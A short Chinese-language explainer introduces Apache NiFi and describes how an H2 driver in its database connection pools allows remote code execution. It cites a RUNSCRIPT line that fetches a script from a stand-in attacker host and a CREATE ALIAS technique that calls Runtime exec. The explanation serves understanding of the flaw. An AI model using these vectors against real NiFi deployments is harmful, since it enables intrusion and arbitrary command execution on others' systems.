Apache NiFi（全称 Apache NiFi）是一个开源的数据集成与数据流管理平台，属于 Apache 软件基金会项目。它是一个可视化、图形化的数据管道（Data Pipeline）工具，让你可以通过拖拽的方式设计“数据从哪里来、怎么处理、往哪里去”的完整流程，而不需要写大量代码。

NiFi 允许用户通过 Controller Services 配置数据库连接池（DBCPConnectionPool 和 HikariCPConnectionPool）。 当用户把 Database Driver Class Name 设置为 org.h2.Driver（H2 驱动，NiFi 默认打包了 H2）时，H2 数据库本身支持非常危险的特性：

  • RUNSCRIPT FROM ‘http://attacker.com/evil.sql’ —— 从远程 URL 加载并执行任意 SQL 脚本
  • CREATE ALIAS + CALL —— 可以定义 Java 方法并直接调用 Runtime.getRuntime().exec() 执行系统命令 这些特性在连接池初始化或第一次建立连接时就会被触发，导致攻击者可以在 NiFi 进程权限下执行任意代码。
